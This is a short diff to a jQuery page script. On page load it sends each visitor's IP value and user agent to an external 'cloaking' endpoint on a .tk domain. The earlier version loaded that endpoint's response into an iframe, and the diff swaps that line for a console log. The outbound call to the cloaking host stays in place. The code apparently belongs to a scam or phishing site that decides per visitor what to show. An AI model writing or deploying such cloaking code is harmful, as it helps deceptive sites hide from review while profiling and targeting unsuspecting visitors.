@@ -19,7 +19,8 @@ $( document ).ready(function() {
         var bidapatlat = patlat[2].split("=")[1];
 	var ua = navigator.userAgent;	
 		$.get('https://ckargo.tk/cloaking/deneme.php?ip='+bidapatlat+'&ua='+ua, function(data) {
-			document.getElementById("framekontrol").src = data;
+			//document.getElementById("framekontrol").src = data;
+			console.log(data);
 			});
   })
 });
